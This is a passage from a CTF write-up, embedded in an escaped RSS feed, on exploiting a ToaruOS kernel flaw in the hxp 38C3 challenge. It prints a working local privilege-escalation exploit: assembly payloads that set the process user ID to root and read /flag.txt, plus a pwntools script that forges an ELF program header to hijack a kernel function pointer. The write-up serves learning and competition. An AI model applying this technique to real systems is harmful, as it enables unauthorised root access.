+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">this_core&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">current_process&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">user&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">uid&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="proof-of-concept">&lt;a href="#proof-of-concept" class="header-anchor">&lt;/a>Proof of Concept
+&lt;/h3>&lt;p>&lt;strong>Note:&lt;/strong> The full script containing all the constants and helper functions to generate the ELF can be found &lt;a class="link" href="solve.py" >here&lt;/a>. I used the excellent &lt;a class="link" href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"
+>pwntools&lt;/a> library to create the ELF.&lt;/p>
+&lt;p>For the user-space payload, we need to call the &lt;code>SYS_SYSFUNC&lt;/code> syscall with &lt;code>TOARU_SYS_FUNC_SYNC&lt;/code> first so that the kernel runs &lt;code>printf&lt;/code>, and by extension, our kernel payload. Then we can read the flag file like we would for a normal file read:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="n">userspace_payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SYS_SYSFUNC&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">TOARU_SYS_FUNC_SYNC&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">shellcraft&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pushstr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/flag.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SYS_OPEN&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;rsp&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">constants&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">O_RDONLY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> mov r12, rax
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SYS_READ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;r12&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;rsp&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">256&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> mov r12, rax
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SYS_WRITE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">constants&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">STDOUT_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;rsp&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;r12&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">syscall&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">SYS_EXIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>For the kernel payload which runs when &lt;code>printf_output&lt;/code> is called, we simply need to patch &lt;code>this_core-&amp;gt;current_process-&amp;gt;user&lt;/code> to &lt;code>root&lt;/code>&amp;rsquo;s user ID (0).
+Since &lt;code>this_core&lt;/code> is &lt;a class="link" href="https://github.com/klange/toaruos/blob/v2.2.0/base/usr/include/kernel/process.h#L232" target="_blank" rel="noopener"
+>accessible via &lt;code>gsbase&lt;/code>&lt;/a> and &lt;code>current_process&lt;/code> is the &lt;a class="link" href="https://github.com/klange/toaruos/blob/v2.2.0/base/usr/include/kernel/process.h#L172-L186" target="_blank" rel="noopener"
+>first element in the struct&lt;/a>, there&amp;rsquo;s thankfully not much to do here:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 28 is the `user` field offset within `current_process`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">kernel_payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> mov rdi, gs:[0x0]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> mov QWORD PTR [rdi + 28], 0
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> ret
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>To generate an ELF containing these payloads, we can pack them together and use pwntools&amp;rsquo; nifty &lt;code>make_elf&lt;/code> function:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="n">elf_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">make_elf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">userspace_payload&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">kernel_payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">extract&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Thankfully, the ELF that pwntools generates runs without hitches on ToaruOS. Otherwise, we might have had to craft the ELF by hand, which doesn&amp;rsquo;t sound fun.&lt;/p>
+&lt;p>To make the ELF loader overwrite &lt;code>printf_output&lt;/code> to point to our &lt;code>kernel_payload&lt;/code>, we need to forge a program header in the ELF. Thankfully, this isn&amp;rsquo;t too much work as we can patch the &lt;code>PT_GNU_STACK&lt;/code> program header in the generated ELF, because ToaruOS doesn&amp;rsquo;t understand nor need it to run our executable:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="n">prog&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">elf_path&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">seg_idx&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p_type&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">s&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">prog&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">segments&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;PT_GNU_STACK&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phdr_ofs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">prog&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_segment_offset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">seg_idx&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phdr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Elf64_Phdr&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phdr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">constants&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PT_LOAD&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># file offset to this phdr&amp;#39;s `p_addr`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phdr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p_offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">phdr_ofs&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Elf64_Phdr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p_paddr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">offset&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># can be obtained with `sudo cat /proc/kallsyms` on a vanilla local build where&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># the local user password isn&amp;#39;t lost? or maybe I attached a debugger on the&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># vanilla local build... forgot what I did in particular tbh...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">printf_output&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x134070&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phdr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p_vaddr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">printf_output&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># `p_addr` points to kernel_payload in virtual memory&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phdr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p_paddr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">prog&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">entry&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">userspace_payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># only need to patch a pointer, which is 8 bytes in x86_64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phdr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p_filesz&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phdr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">p_memsz&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">prog&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">prog&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">offset_to_vaddr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">phdr_ofs&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">phdr&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">prog&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;solver&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Finally, we can upload the resulting &lt;code>solver&lt;/code> binary somewhere and connect to the provided shell to capture the flag:&lt;/p>
+&lt;p>&lt;img src="https://krsh732.github.io/p/hxp-38c3-ctf-ser-szwajcarski/flag.png"
+width="2048"
+height="670"
+srcset="https://krsh732.github.io/p/hxp-38c3-ctf-ser-szwajcarski/flag_hu_196b09a9e420a92b.png 480w, https://krsh732.github.io/p/hxp-38c3-ctf-ser-szwajcarski/flag_hu_88638351577b26cb.png 1024w"
+loading="lazy"
+alt="Capturing the flag (click to enlarge)"
+class="gallery-image"
+data-flex-grow="305"
+data-flex-basis="733px"
+>&lt;/p>
+&lt;h2 id="the-end">&lt;a href="#the-end" class="header-anchor">&lt;/a>The End
+&lt;/h2>&lt;p>ToaruOS was a really cool OS, and I thoroughly enjoyed hacking through it! Despite this being a baby challenge, I learned a lot about OS development and x86_64 in doing it. Though none of that would be apparent from this write-up, as most of what I learned ended up being unnecessary for the exploit I found 🙃&lt;/p>
+&lt;p>Funnily enough, I later learned that Josh had independently discovered the same vulnerability earlier, though he didn&amp;rsquo;t exploit it. He also found another cool one that involves a physical use-after-free which he did &lt;a class="link" href="https://joshsteffen.com/posts/hxp-38c3-ctf-ser-szwajcarski/" target="_blank" rel="noopener"
+>exploit and write about&lt;/a>!&lt;/p></description></item></channel></rss>
